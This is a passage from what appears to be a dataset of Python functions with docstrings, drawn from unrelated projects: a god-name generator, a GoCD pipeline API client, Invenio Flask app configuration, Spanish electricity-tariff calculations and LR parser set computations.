            "def spawn(self, generations):\n        \"\"\"Grow this Pantheon by multiplying Gods.\"\"\"\n        egg_donors = [god for god in self.gods.values() if god.chromosomes == 'XX']\n        sperm_donors = [god for god in self.gods.values() if god.chromosomes == 'XY']\n\n        for i in range(generations):\n            print(\"\\nGENERATION %d\\n\" % (i+1))\n            gen_xx = []\n            gen_xy = []\n\n            for egg_donor in egg_donors:\n                sperm_donor = random.choice(sperm_donors)\n                brood = self.breed(egg_donor, sperm_donor)\n\n                for child in brood:\n                    if child.divinity > human:\n                        # divine offspring join the Pantheon\n                        self.add_god(child)\n                    if child.chromosomes == 'XX':\n                        gen_xx.append(child)\n                    else:\n                        gen_xy.append(child)\n\n            # elder gods leave the breeding pool\n            egg_donors = [ed for ed in egg_donors if ed.generation > (i-2)]\n            sperm_donors = [sd for sd in sperm_donors if sd.generation > (i-3)]\n\n            # mature offspring join the breeding pool\n            egg_donors += gen_xx\n            sperm_donors += gen_xy"
        ],
        [
            "def breed(self, egg_donor, sperm_donor):\n        \"\"\"Get it on.\"\"\"\n        offspring = []\n        try:\n            num_children = npchoice([1,2], 1, p=[0.8, 0.2])[0] # 20% chance of twins\n            for _ in range(num_children):\n                child = God(egg_donor, sperm_donor)\n                offspring.append(child)\n                send_birth_announcement(egg_donor, sperm_donor, child)\n        except ValueError:\n            print(\"Breeding error occurred. Likely the generator ran out of names.\")\n\n        return offspring"
        ],
        [
            "def cosine(vec1, vec2):\n    \"\"\"Compare vectors. Borrowed from A. Parish.\"\"\"\n    if norm(vec1) > 0 and norm(vec2) > 0:\n        return dot(vec1, vec2) / (norm(vec1) * norm(vec2))\n    else:\n        return 0.0"
        ],
        [
            "def set_gender(self, gender=None):\n        \"\"\"This model recognizes that sex chromosomes don't always line up with\n        gender. Assign M, F, or NB according to the probabilities in p_gender.\n        \"\"\"\n        if gender and gender in genders:\n            self.gender = gender\n        else:\n            if not self.chromosomes: self.set_chromosomes()\n            self.gender = npchoice(genders, 1, p=p_gender[self.chromosomes])[0]"
        ],
        [
            "def set_inherited_traits(self, egg_donor, sperm_donor):\n        \"\"\"Accept either strings or Gods as inputs.\"\"\"\n        if type(egg_donor) == str:\n            self.reproduce_asexually(egg_donor, sperm_donor)\n        else:\n            self.reproduce_sexually(egg_donor, sperm_donor)"
        ],
        [
            "def reproduce_asexually(self, egg_word, sperm_word):\n        \"\"\"Produce two gametes, an egg and a sperm, from the input strings.\n        Combine them to produce a genome a la sexual reproduction.\n        \"\"\"\n        egg = self.generate_gamete(egg_word)\n        sperm = self.generate_gamete(sperm_word)\n\n        self.genome = list(set(egg + sperm)) # Eliminate duplicates\n        self.generation = 1\n        self.divinity = god"
        ],
        [
            "def reproduce_sexually(self, egg_donor, sperm_donor):\n        \"\"\"Produce two gametes, an egg and a sperm, from input Gods. Combine\n        them to produce a genome a la sexual reproduction. Assign divinity\n        according to probabilities in p_divinity. The more divine the parents,\n        the more divine their offspring.\n        \"\"\"\n        egg_word = random.choice(egg_donor.genome)\n        egg = self.generate_gamete(egg_word)\n        sperm_word = random.choice(sperm_donor.genome)\n        sperm = self.generate_gamete(sperm_word)\n\n        self.genome = list(set(egg + sperm)) # Eliminate duplicates\n        self.parents = [egg_donor.name, sperm_donor.name]\n        self.generation = max(egg_donor.generation, sperm_donor.generation) + 1\n        sum_ = egg_donor.divinity + sperm_donor.divinity\n        self.divinity = int(npchoice(divinities, 1, p=p_divinity[sum_])[0])"
        ],
        [
            "def generate_gamete(self, egg_or_sperm_word):\n        \"\"\"Extract 23 'chromosomes' aka words from 'gene pool' aka list of tokens\n        by searching the list of tokens for words that are related to the given\n        egg_or_sperm_word.\n        \"\"\"\n        p_rate_of_mutation = [0.9, 0.1]\n        should_use_mutant_pool = (npchoice([0,1], 1, p=p_rate_of_mutation)[0] == 1)\n        if should_use_mutant_pool:\n            pool = tokens.secondary_tokens\n        else:\n            pool = tokens.primary_tokens\n\n        return get_matches(egg_or_sperm_word, pool, 23)"
        ],
        [
            "def print_parents(self):\n        \"\"\"Print parents' names and epithets.\"\"\"\n        if self.gender == female:\n            title = 'Daughter'\n        elif self.gender == male:\n            title = 'Son'\n        else:\n            title = 'Child'\n\n        p1 = self.parents[0]\n        p2 = self.parents[1]\n\n        template = '%s of %s, the %s, and %s, the %s.'\n\n        print(template % (title, p1.name, p1.epithet, p2.name, p2.epithet))"
        ],
        [
            "def instance(self, counter=None, pipeline_counter=None):\n        \"\"\"Returns all the information regarding a specific stage run\n\n        See the `Go stage instance documentation`__ for examples.\n\n        .. __: http://api.go.cd/current/#get-stage-instance\n\n        Args:\n          counter (int): The stage instance to fetch.\n            If falsey returns the latest stage instance from :meth:`history`.\n          pipeline_counter (int): The pipeline instance for which to fetch\n            the stage. If falsey returns the latest pipeline instance.\n\n        Returns:\n          Response: :class:`gocd.api.response.Response` object\n        \"\"\"\n        pipeline_counter = pipeline_counter or self.pipeline_counter\n        pipeline_instance = None\n\n        if not pipeline_counter:\n            pipeline_instance = self.server.pipeline(self.pipeline_name).instance()\n            self.pipeline_counter = int(pipeline_instance['counter'])\n\n        if not counter:\n            if pipeline_instance is None:\n                pipeline_instance = (\n                    self.server\n                        .pipeline(self.pipeline_name)\n                        .instance(pipeline_counter)\n                )\n\n            for stages in pipeline_instance['stages']:\n                if stages['name'] == self.stage_name:\n                    return self.instance(\n                        counter=int(stages['counter']),\n                        pipeline_counter=pipeline_counter\n                    )\n\n        return self._get('/instance/{pipeline_counter:d}/{counter:d}'\n                         .format(pipeline_counter=pipeline_counter, counter=counter))"
        ],
        [
            "def request(self, path, data=None, headers=None, method=None):\n        \"\"\"Performs a HTTP request to the Go server\n\n        Args:\n          path (str): The full path on the Go server to request.\n            This includes any query string attributes.\n          data (str, dict, bool, optional): If any data is present this\n            request will become a POST request.\n          headers (dict, optional): Headers to set for this particular\n            request\n\n        Raises:\n          HTTPError: when the HTTP request fails.\n\n        Returns:\n          file like object: The response from a\n            :func:`urllib2.urlopen` call\n        \"\"\"\n        if isinstance(data, str):\n            data = data.encode('utf-8')\n        response = urlopen(self._request(path, data=data, headers=headers, method=method))\n        self._set_session_cookie(response)\n\n        return response"
        ],
        [
            "def add_logged_in_session(self, response=None):\n        \"\"\"Make the request appear to be coming from a browser\n\n        This is to interact with older parts of Go that doesn't have a\n        proper API call to be made. What will be done:\n\n        1. If no response passed in a call to `go/api/pipelines.xml` is\n           made to get a valid session\n        2. `JSESSIONID` will be populated from this request\n        3. A request to `go/pipelines` will be so the\n           `authenticity_token` (CSRF) can be extracted. It will then\n           silently be injected into `post_args` on any POST calls that\n           doesn't start with `go/api` from this point.\n\n        Args:\n          response: a :class:`Response` object from a previously successful\n            API call. So we won't have to query `go/api/pipelines.xml`\n            unnecessarily.\n\n        Raises:\n          HTTPError: when the HTTP request fails.\n          AuthenticationFailed: when failing to get the `session_id`\n            or the `authenticity_token`.\n        \"\"\"\n        if not response:\n            response = self.get('go/api/pipelines.xml')\n\n        self._set_session_cookie(response)\n\n        if not self._session_id:\n            raise AuthenticationFailed('No session id extracted from request.')\n\n        response = self.get('go/pipelines')\n        match = re.search(\n            r'name=\"authenticity_token\".+?value=\"([^\"]+)',\n            response.read().decode('utf-8')\n        )\n        if match:\n            self._authenticity_token = match.group(1)\n        else:\n            raise AuthenticationFailed('Authenticity token not found on page')"
        ],
        [
            "def flatten(d):\n    \"\"\"Return a dict as a list of lists.\n\n    >>> flatten({\"a\": \"b\"})\n    [['a', 'b']]\n    >>> flatten({\"a\": [1, 2, 3]})\n    [['a', [1, 2, 3]]]\n    >>> flatten({\"a\": {\"b\": \"c\"}})\n    [['a', 'b', 'c']]\n    >>> flatten({\"a\": {\"b\": {\"c\": \"e\"}}})\n    [['a', 'b', 'c', 'e']]\n    >>> flatten({\"a\": {\"b\": \"c\", \"d\": \"e\"}})\n    [['a', 'b', 'c'], ['a', 'd', 'e']]\n    >>> flatten({\"a\": {\"b\": \"c\", \"d\": \"e\"}, \"b\": {\"c\": \"d\"}})\n    [['a', 'b', 'c'], ['a', 'd', 'e'], ['b', 'c', 'd']]\n\n    \"\"\"\n\n    if not isinstance(d, dict):\n        return [[d]]\n\n    returned = []\n    for key, value in d.items():\n        # Each key, value is treated as a row.\n        nested = flatten(value)\n        for nest in nested:\n            current_row = [key]\n            current_row.extend(nest)\n            returned.append(current_row)\n\n    return returned"
        ],
        [
            "def instance(self, counter=None):\n        \"\"\"Returns all the information regarding a specific pipeline run\n\n        See the `Go pipeline instance documentation`__ for examples.\n\n        .. __: http://api.go.cd/current/#get-pipeline-instance\n\n        Args:\n          counter (int): The pipeline instance to fetch.\n            If falsey returns the latest pipeline instance from :meth:`history`.\n\n        Returns:\n          Response: :class:`gocd.api.response.Response` object\n        \"\"\"\n        if not counter:\n            history = self.history()\n            if not history:\n                return history\n            else:\n                return Response._from_json(history['pipelines'][0])\n\n        return self._get('/instance/{counter:d}'.format(counter=counter))"
        ],
        [
            "def schedule(self, variables=None, secure_variables=None, materials=None,\n                 return_new_instance=False, backoff_time=1.0):\n        \"\"\"Schedule a pipeline run\n\n        Aliased as :meth:`run`, :meth:`schedule`, and :meth:`trigger`.\n\n        Args:\n          variables (dict, optional): Variables to set/override\n          secure_variables (dict, optional): Secure variables to set/override\n          materials (dict, optional): Material revisions to be used for\n            this pipeline run. The exact format for this is a bit iffy,\n            have a look at the official\n            `Go pipeline scheduling documentation`__ or inspect a call\n            from triggering manually in the UI.\n          return_new_instance (bool): Returns a :meth:`history` compatible\n            response for the newly scheduled instance. This is primarily so\n            users easily can get the new instance number. **Note:** This is done\n            in a very naive way, it just checks that the instance number is\n            higher than before the pipeline was triggered.\n          backoff_time (float): How long between each check for\n            :arg:`return_new_instance`.\n\n         .. __: http://api.go.cd/current/#scheduling-pipelines\n\n        Returns:\n          Response: :class:`gocd.api.response.Response` object\n        \"\"\"\n        scheduling_args = dict(\n            variables=variables,\n            secure_variables=secure_variables,\n            material_fingerprint=materials,\n            headers={\"Confirm\": True},\n        )\n\n        scheduling_args = dict((k, v) for k, v in scheduling_args.items() if v is not None)\n\n        # TODO: Replace this with whatever is the official way as soon as gocd#990 is fixed.\n        # https://github.com/gocd/gocd/issues/990\n        if return_new_instance:\n            pipelines = self.history()['pipelines']\n            if len(pipelines) == 0:\n                last_run = None\n            else:\n                last_run = pipelines[0]['counter']\n            response = self._post('/schedule', ok_status=202, **scheduling_args)\n            if not response:\n                return response\n\n            max_tries = 10\n            while max_tries > 0:\n                current = self.instance()\n                if not last_run and current:\n                    return current\n                elif last_run and current['counter'] > last_run:\n                    return current\n                else:\n                    time.sleep(backoff_time)\n                    max_tries -= 1\n\n            # I can't come up with a scenario in testing where this would happen, but it seems\n            # better than returning None.\n            return response\n        else:\n            return self._post('/schedule', ok_status=202, **scheduling_args)"
        ],
        [
            "def console_output(self, instance=None):\n        \"\"\"Yields the output and metadata from all jobs in the pipeline\n\n        Args:\n          instance: The result of a :meth:`instance` call, if not supplied\n            the latest of the pipeline will be used.\n\n        Yields:\n          tuple: (metadata (dict), output (str)).\n\n          metadata contains:\n            - pipeline\n            - pipeline_counter\n            - stage\n            - stage_counter\n            - job\n            - job_result\n        \"\"\"\n        if instance is None:\n            instance = self.instance()\n\n        for stage in instance['stages']:\n            for job in stage['jobs']:\n                if job['result'] not in self.final_results:\n                    continue\n\n                artifact = self.artifact(\n                    instance['counter'],\n                    stage['name'],\n                    job['name'],\n                    stage['counter']\n                )\n                output = artifact.get('cruise-output/console.log')\n\n                yield (\n                    {\n                        'pipeline': self.name,\n                        'pipeline_counter': instance['counter'],\n                        'stage': stage['name'],\n                        'stage_counter': stage['counter'],\n                        'job': job['name'],\n                        'job_result': job['result'],\n                    },\n                    output.body\n                )"
        ],
        [
            "def edit(self, config, etag):\n        \"\"\"Update template config for specified template name.\n\n        .. __: https://api.go.cd/current/#edit-template-config\n\n        Returns:\n          Response: :class:`gocd.api.response.Response` object\n        \"\"\"\n\n        data = self._json_encode(config)\n        headers = self._default_headers()\n\n        if etag is not None:\n            headers[\"If-Match\"] = etag\n\n        return self._request(self.name,\n                             ok_status=None,\n                             data=data,\n                             headers=headers,\n                             method=\"PUT\")"
        ],
        [
            "def create(self, config):\n        \"\"\"Create template config for specified template name.\n\n        .. __: https://api.go.cd/current/#create-template-config\n\n        Returns:\n          Response: :class:`gocd.api.response.Response` object\n        \"\"\"\n\n        assert config[\"name\"] == self.name, \"Given config is not for this template\"\n\n        data = self._json_encode(config)\n        headers = self._default_headers()\n\n        return self._request(\"\",\n                             ok_status=None,\n                             data=data,\n                             headers=headers)"
        ],
        [
            "def delete(self):\n        \"\"\"Delete template config for specified template name.\n\n        .. __: https://api.go.cd/current/#delete-a-template\n\n        Returns:\n          Response: :class:`gocd.api.response.Response` object\n        \"\"\"\n\n        headers = self._default_headers()\n\n        return self._request(self.name,\n                             ok_status=None,\n                             data=None,\n                             headers=headers,\n                             method=\"DELETE\")"
        ],
        [
            "def pipelines(self):\n        \"\"\"Returns a set of all pipelines from the last response\n\n        Returns:\n          set: Response success: all the pipelines available in the response\n               Response failure: an empty set\n        \"\"\"\n        if not self.response:\n            return set()\n        elif self._pipelines is None and self.response:\n            self._pipelines = set()\n            for group in self.response.payload:\n                for pipeline in group['pipelines']:\n                    self._pipelines.add(pipeline['name'])\n\n        return self._pipelines"
        ],
        [
            "def get_directory(self, path_to_directory, timeout=30, backoff=0.4, max_wait=4):\n        \"\"\"Gets an artifact directory by its path.\n\n        See the `Go artifact directory documentation`__ for example responses.\n\n        .. __: http://api.go.cd/current/#get-artifact-directory\n\n        .. note::\n          Getting a directory relies on Go creating a zip file of the\n          directory in question. Because of this Go will zip the file in\n          the background and return a 202 Accepted response. It's then up\n          to the client to check again later and get the final file.\n\n          To work with normal assumptions this :meth:`get_directory` will\n          retry itself up to ``timeout`` seconds to get a 200 response to\n          return. At that point it will then return the response as is, no\n          matter whether it's still 202 or 200. The retry is done with an\n          exponential backoff with a max value between retries. See the\n          ``backoff`` and ``max_wait`` variables.\n\n          If you want to handle the retry logic yourself then use :meth:`get`\n          and add '.zip' as a suffix on the directory.\n\n        Args:\n          path_to_directory (str): The path to the directory to get.\n            It can be nested eg ``target/dist.zip``\n          timeout (int): How many seconds we will wait in total for a\n            successful response from Go when we're receiving 202\n          backoff (float): The initial value used for backoff, raises\n            exponentially until it reaches ``max_wait``\n          max_wait (int): The max time between retries\n\n        Returns:\n          Response: :class:`gocd.api.response.Response` object\n            A successful response is a zip-file.\n        \"\"\"\n        response = None\n        started_at = None\n        time_elapsed = 0\n\n        i = 0\n        while time_elapsed < timeout:\n            response = self._get('{0}.zip'.format(path_to_directory))\n\n            if response:\n                break\n            else:\n                if started_at is None:\n                    started_at = time.time()\n\n                time.sleep(min(backoff * (2 ** i), max_wait))\n                i += 1\n                time_elapsed = time.time() - started_at\n\n        return response"
        ],
        [
            "def config_loader(app, **kwargs_config):\n    \"\"\"Configuration loader.\n\n    Adds support for loading templates from the Flask application's instance\n    folder (``<instance_folder>/templates``).\n    \"\"\"\n    # This is the only place customize the Flask application right after\n    # it has been created, but before all extensions etc are loaded.\n    local_templates_path = os.path.join(app.instance_path, 'templates')\n    if os.path.exists(local_templates_path):\n        # Let's customize the template loader to look into packages\n        # and application templates folders.\n        app.jinja_loader = ChoiceLoader([\n            FileSystemLoader(local_templates_path),\n            app.jinja_loader,\n        ])\n\n    app.jinja_options = dict(\n        app.jinja_options,\n        cache_size=1000,\n        bytecode_cache=BytecodeCache(app)\n    )\n\n    invenio_config_loader(app, **kwargs_config)"
        ],
        [
            "def app_class():\n    \"\"\"Create Flask application class.\n\n    Invenio-Files-REST needs to patch the Werkzeug form parsing in order to\n    support streaming large file uploads. This is done by subclassing the Flask\n    application class.\n    \"\"\"\n    try:\n        pkg_resources.get_distribution('invenio-files-rest')\n        from invenio_files_rest.app import Flask as FlaskBase\n    except pkg_resources.DistributionNotFound:\n        from flask import Flask as FlaskBase\n\n    # Add Host header validation via APP_ALLOWED_HOSTS configuration variable.\n    class Request(TrustedHostsMixin, FlaskBase.request_class):\n        pass\n\n    class Flask(FlaskBase):\n        request_class = Request\n\n    return Flask"
        ],
        [
            "def init_app(self, app, **kwargs):\n        \"\"\"Initialize application object.\n\n        :param app: An instance of :class:`~flask.Flask`.\n        \"\"\"\n        # Init the configuration\n        self.init_config(app)\n        # Enable Rate limiter\n        self.limiter = Limiter(app, key_func=get_ipaddr)\n        # Enable secure HTTP headers\n        if app.config['APP_ENABLE_SECURE_HEADERS']:\n            self.talisman = Talisman(\n                app, **app.config.get('APP_DEFAULT_SECURE_HEADERS', {})\n            )\n        # Enable PING view\n        if app.config['APP_HEALTH_BLUEPRINT_ENABLED']:\n            blueprint = Blueprint('invenio_app_ping', __name__)\n\n            @blueprint.route('/ping')\n            def ping():\n                \"\"\"Load balancer ping view.\"\"\"\n                return 'OK'\n\n            ping.talisman_view_options = {'force_https': False}\n\n            app.register_blueprint(blueprint)\n\n        requestid_header = app.config.get('APP_REQUESTID_HEADER')\n        if requestid_header:\n            @app.before_request\n            def set_request_id():\n                \"\"\"Extracts a request id from an HTTP header.\"\"\"\n                request_id = request.headers.get(requestid_header)\n                if request_id:\n                    # Capped at 200 to protect against malicious clients\n                    # sending very large headers.\n                    g.request_id = request_id[:200]\n\n        # If installed register the Flask-DebugToolbar extension\n        try:\n            from flask_debugtoolbar import DebugToolbarExtension\n            app.extensions['flask-debugtoolbar'] = DebugToolbarExtension(app)\n        except ImportError:\n            app.logger.debug('Flask-DebugToolbar extension not installed.')\n\n        # Register self\n        app.extensions['invenio-app'] = self"
        ],
        [
            "def init_config(self, app):\n        \"\"\"Initialize configuration.\n\n        :param app: An instance of :class:`~flask.Flask`.\n        \"\"\"\n        config_apps = ['APP_', 'RATELIMIT_']\n        flask_talisman_debug_mode = [\"'unsafe-inline'\"]\n        for k in dir(config):\n            if any([k.startswith(prefix) for prefix in config_apps]):\n                app.config.setdefault(k, getattr(config, k))\n\n        if app.config['DEBUG']:\n            app.config.setdefault('APP_DEFAULT_SECURE_HEADERS', {})\n            headers = app.config['APP_DEFAULT_SECURE_HEADERS']\n            # ensure `content_security_policy` is not set to {}\n            if headers.get('content_security_policy') != {}:\n                headers.setdefault('content_security_policy', {})\n                csp = headers['content_security_policy']\n                # ensure `default-src` is not set to []\n                if csp.get('default-src') != []:\n                    csp.setdefault('default-src', [])\n                    # add default `content_security_policy` value when debug\n                    csp['default-src'] += flask_talisman_debug_mode"
        ],
        [
            "def camel2word(string):\n    \"\"\"Covert name from CamelCase to \"Normal case\".\n\n    >>> camel2word('CamelCase')\n    'Camel case'\n    >>> camel2word('CaseWithSpec')\n    'Case with spec'\n    \"\"\"\n    def wordize(match):\n        return ' ' + match.group(1).lower()\n\n    return string[0] + re.sub(r'([A-Z])', wordize, string[1:])"
        ],
        [
            "def format_seconds(self, n_seconds):\n        \"\"\"Format a time in seconds.\"\"\"\n        func = self.ok\n        if n_seconds >= 60:\n            n_minutes, n_seconds = divmod(n_seconds, 60)\n            return \"%s minutes %s seconds\" % (\n                        func(\"%d\" % n_minutes),\n                        func(\"%.3f\" % n_seconds))\n        else:\n            return \"%s seconds\" % (\n                        func(\"%.3f\" % n_seconds))"
        ],
        [
            "def ppdict(dict_to_print, br='\\n', html=False, key_align='l', sort_keys=True,\n           key_preffix='', key_suffix='', value_prefix='', value_suffix='', left_margin=3, indent=2):\n    \"\"\"Indent representation of a dict\"\"\"\n    if dict_to_print:\n        if sort_keys:\n            dic = dict_to_print.copy()\n            keys = list(dic.keys())\n            keys.sort()\n            dict_to_print = OrderedDict()\n            for k in keys:\n                dict_to_print[k] = dic[k]\n\n        tmp = ['{']\n        ks = [type(x) == str and \"'%s'\" % x or x for x in dict_to_print.keys()]\n        vs = [type(x) == str and \"'%s'\" % x or x for x in dict_to_print.values()]\n        max_key_len = max([len(str(x)) for x in ks])\n\n        for i in range(len(ks)):\n            k = {1: str(ks[i]).ljust(max_key_len),\n                 key_align == 'r': str(ks[i]).rjust(max_key_len)}[1]\n\n            v = vs[i]\n            tmp.append(' ' * indent + '{}{}{}:{}{}{},'.format(key_preffix, k, key_suffix,\n                                                              value_prefix, v, value_suffix))\n\n        tmp[-1] = tmp[-1][:-1]  # remove the ',' in the last item\n        tmp.append('}')\n\n        if left_margin:\n            tmp = [' ' * left_margin + x for x in tmp]\n\n        if html:\n            return '<code>{}</code>'.format(br.join(tmp).replace(' ', '&nbsp;'))\n        else:\n            return br.join(tmp)\n    else:\n        return '{}'"
        ],
        [
            "def _assert_contains(haystack, needle, invert, escape=False):\n    \"\"\"\n    Test for existence of ``needle`` regex within ``haystack``.\n\n    Say ``escape`` to escape the ``needle`` if you aren't really using the\n    regex feature & have special characters in it.\n    \"\"\"\n    myneedle = re.escape(needle) if escape else needle\n    matched = re.search(myneedle, haystack, re.M)\n    if (invert and matched) or (not invert and not matched):\n        raise AssertionError(\"'%s' %sfound in '%s'\" % (\n            needle,\n            \"\" if invert else \"not \",\n            haystack\n        ))"
        ],
        [
            "def flag_inner_classes(obj):\n    \"\"\"\n    Mutates any attributes on ``obj`` which are classes, with link to ``obj``.\n\n    Adds a convenience accessor which instantiates ``obj`` and then calls its\n    ``setup`` method.\n\n    Recurses on those objects as well.\n    \"\"\"\n    for tup in class_members(obj):\n        tup[1]._parent = obj\n        tup[1]._parent_inst = None\n        tup[1].__getattr__ = my_getattr\n        flag_inner_classes(tup[1])"
        ],
        [
            "def pvpc_calc_tcu_cp_feu_d(df, verbose=True, convert_kwh=True):\n    \"\"\"Procesa TCU, CP, FEU diario.\n\n    :param df:\n    :param verbose:\n    :param convert_kwh:\n    :return:\n    \"\"\"\n    if 'TCU' + TARIFAS[0] not in df.columns:\n        # Pasa de \u20ac/MWh a \u20ac/kWh:\n        if convert_kwh:\n            cols_mwh = [c + t for c in COLS_PVPC for t in TARIFAS if c != 'COF']\n            df[cols_mwh] = df[cols_mwh].applymap(lambda x: x / 1000.)\n        # Obtiene columnas TCU, CP, precio d\u00eda\n        gb_t = df.groupby(lambda x: TARIFAS[np.argmax([t in x for t in TARIFAS])], axis=1)\n        for k, g in gb_t:\n            if verbose:\n                print('TARIFA {}'.format(k))\n                print(g.head())\n\n            # C\u00e1lculo de TCU\n            df['TCU{}'.format(k)] = g[k] - g['TEU{}'.format(k)]\n\n            # C\u00e1lculo de CP\n            # cols_cp = [c + k for c in ['FOS', 'FOM', 'INT', 'PCAP', 'PMH', 'SAH']]\n            cols_cp = [c + k for c in COLS_PVPC if c not in ['', 'COF', 'TEU']]\n            df['CP{}'.format(k)] = g[cols_cp].sum(axis=1)\n\n            # C\u00e1lculo de PERD --> No es posible as\u00ed, ya que los valores base ya vienen con PERD\n            # dfs_pvpc[k]['PERD{}'.format(k)] = dfs_pvpc[k]['TCU{}'.format(k)] / dfs_pvpc[k]['CP{}'.format(k)]\n            # dfs_pvpc[k]['PERD{}'.format(k)] = dfs_pvpc[k]['INT{}'.format(k)] / 1.92\n\n            # C\u00e1lculo de FEU diario\n            cols_k = ['TEU' + k, 'TCU' + k, 'COF' + k]\n            g = df[cols_k].groupby('TEU' + k)\n            pr = g.apply(lambda x: x['TCU' + k].dot(x['COF' + k]) / x['COF' + k].sum())\n            pr.name = 'PD_' + k\n            df = df.join(pr, on='TEU' + k, rsuffix='_r')\n            df['PD_' + k] += df['TEU' + k]\n    return df"
        ],
        [
            "def _compress(self, input_str):\n        \"\"\"\n        Compress the log message in order to send less bytes to the wire.\n        \"\"\"\n        compressed_bits = cStringIO.StringIO()\n        \n        f = gzip.GzipFile(fileobj=compressed_bits, mode='wb')\n        f.write(input_str)\n        f.close()\n        \n        return compressed_bits.getvalue()"
        ],
        [
            "def registerGoodClass(self, class_):\n        \"\"\"\n        Internal bookkeeping to handle nested classes\n        \"\"\"\n        # Class itself added to \"good\" list\n        self._valid_classes.append(class_)\n        # Recurse into any inner classes\n        for name, cls in class_members(class_):\n            if self.isValidClass(cls):\n                self.registerGoodClass(cls)"
        ],
        [
            "def isValidClass(self, class_):\n        \"\"\"\n        Needs to be its own method so it can be called from both wantClass and\n        registerGoodClass.\n        \"\"\"\n        module = inspect.getmodule(class_)\n        valid = (\n            module in self._valid_modules\n            or (\n                hasattr(module, '__file__')\n                and module.__file__ in self._valid_named_modules\n            )\n        )\n        return valid and not private(class_)"
        ],
        [
            "def get_resample_data(self):\n        \"\"\"Obtiene los dataframes de los datos de PVPC con resampling diario y mensual.\"\"\"\n        if self.data is not None:\n            if self._pvpc_mean_daily is None:\n                self._pvpc_mean_daily = self.data['data'].resample('D').mean()\n            if self._pvpc_mean_monthly is None:\n                self._pvpc_mean_monthly = self.data['data'].resample('MS').mean()\n        return self._pvpc_mean_daily, self._pvpc_mean_monthly"
        ],
        [
            "def sanitize_path(path):\n    \"\"\"Performs sanitation of the path after validating\n\n    :param path: path to sanitize\n    :return: path\n    :raises:\n        - InvalidPath if the path doesn't start with a slash\n    \"\"\"\n\n    if path == '/':  # Nothing to do, just return\n        return path\n\n    if path[:1] != '/':\n        raise InvalidPath('The path must start with a slash')\n\n    # Deduplicate slashes in path\n    path = re.sub(r'/+', '/', path)\n\n    # Strip trailing slashes and return\n    return path.rstrip('/')"
        ],
        [
            "def _validate_schema(obj):\n    \"\"\"Ensures the passed schema instance is compatible\n\n    :param obj: object to validate\n    :return: obj\n    :raises:\n        - IncompatibleSchema if the passed schema is of an incompatible type\n    \"\"\"\n\n    if obj is not None and not isinstance(obj, Schema):\n        raise IncompatibleSchema('Schema must be of type {0}'.format(Schema))\n\n    return obj"
        ],
        [
            "def route(bp, *args, **kwargs):\n    \"\"\"Journey route decorator\n\n    Enables simple serialization, deserialization and validation of Flask routes with the help of Marshmallow.\n\n    :param bp: :class:`flask.Blueprint` object\n    :param args: args to pass along to `Blueprint.route`\n    :param kwargs:\n        - :strict_slashes: Enable / disable strict slashes (default False)\n        - :validate: Enable / disable body/query validation (default True)\n        - :_query: Unmarshal Query string into this schema\n        - :_body: Unmarshal JSON body into this schema\n        - :marshal_with: Serialize the output with this schema\n    :raises:\n        - ValidationError if the query parameters or JSON body fails validation\n    \"\"\"\n\n    kwargs['strict_slashes'] = kwargs.pop('strict_slashes', False)\n    body = _validate_schema(kwargs.pop('_body', None))\n    query = _validate_schema(kwargs.pop('_query', None))\n    output = _validate_schema(kwargs.pop('marshal_with', None))\n    validate = kwargs.pop('validate', True)\n\n    def decorator(f):\n        @bp.route(*args, **kwargs)\n        @wraps(f)\n        def wrapper(*inner_args, **inner_kwargs):\n            \"\"\"If a schema (_body and/or _query) was supplied to the route decorator, the deserialized\n            :class`marshmallow.Schema` object is injected into the decorated function's kwargs.\"\"\"\n\n            try:\n                if query is not None:\n                    query.strict = validate\n                    url = furl(request.url)\n                    inner_kwargs['_query'] = query.load(data=url.args)\n\n                if body is not None:\n                    body.strict = validate\n                    json_data = request.get_json()\n\n                    if json_data is None:\n                        # Set json_data to empty dict if body is empty, so it gets picked up by the validator\n                        json_data = {}\n\n                    inner_kwargs['_body'] = body.load(data=json_data)\n\n            except ValidationError as err:\n                return jsonify(err.messages), 422\n\n            if output:\n                data = output.dump(f(*inner_args, **inner_kwargs))\n                return jsonify(data[0])\n\n            return f(*inner_args, **inner_kwargs)\n\n        return f\n\n    return decorator"
        ],
        [
            "def attach_bp(self, bp, description=''):\n        \"\"\"Attaches a flask.Blueprint to the bundle\n\n        :param bp: :class:`flask.Blueprint` object\n        :param description: Optional description string\n        :raises:\n            - InvalidBlueprint if the Blueprint is not of type `flask.Blueprint`\n        \"\"\"\n\n        if not isinstance(bp, Blueprint):\n            raise InvalidBlueprint('Blueprints attached to the bundle must be of type {0}'.format(Blueprint))\n\n        self.blueprints.append((bp, description))"
        ],
        [
            "def move_dot(self):\n        \"\"\"Returns the DottedRule that results from moving the dot.\"\"\"\n        return self.__class__(self.production, self.pos + 1, self.lookahead)"
        ],
        [
            "def first(self, symbols):\n        \"\"\"Computes the intermediate FIRST set using symbols.\"\"\"\n        ret = set()\n\n        if EPSILON in symbols:\n            return set([EPSILON])\n\n        for symbol in symbols:\n            ret |= self._first[symbol] - set([EPSILON])\n            if EPSILON not in self._first[symbol]:\n                break\n        else:\n            ret.add(EPSILON)\n\n        return ret"
        ],
        [
            "def _compute_first(self):\n        \"\"\"Computes the FIRST set for every symbol in the grammar.\n\n        Tenatively based on _compute_first in PLY.\n        \"\"\"\n        for terminal in self.terminals:\n            self._first[terminal].add(terminal)\n        self._first[END_OF_INPUT].add(END_OF_INPUT)\n\n        while True:\n            changed = False\n\n            for nonterminal, productions in self.nonterminals.items():\n                for production in productions:\n                    new_first = self.first(production.rhs)\n                    if new_first - self._first[nonterminal]:\n                        self._first[nonterminal] |= new_first\n                        changed = True\n\n            if not changed:\n                break"
        ],
        [
            "def _compute_follow(self):\n        \"\"\"Computes the FOLLOW set for every non-terminal in the grammar.\n\n        Tenatively based on _compute_follow in PLY.\n        \"\"\"\n        self._follow[self.start_symbol].add(END_OF_INPUT)\n\n        while True:\n            changed = False\n\n            for nonterminal, productions in self.nonterminals.items():\n                for production in productions:\n                    for i, symbol in enumerate(production.rhs):\n                        if symbol not in self.nonterminals:\n                            continue\n\n                        first = self.first(production.rhs[i + 1:])\n                        new_follow = first - set([EPSILON])\n                        if EPSILON in first or i == (len(production.rhs) - 1):\n                            new_follow |= self._follow[nonterminal]\n\n                        if new_follow - self._follow[symbol]:\n                            self._follow[symbol] |= new_follow\n                            changed = True\n\n            if not changed:\n                break"
        ],
        [
            "def initial_closure(self):\n        \"\"\"Computes the initial closure using the START_foo production.\"\"\"\n        first_rule = DottedRule(self.start, 0, END_OF_INPUT)\n        return self.closure([first_rule])"
        ],
        [
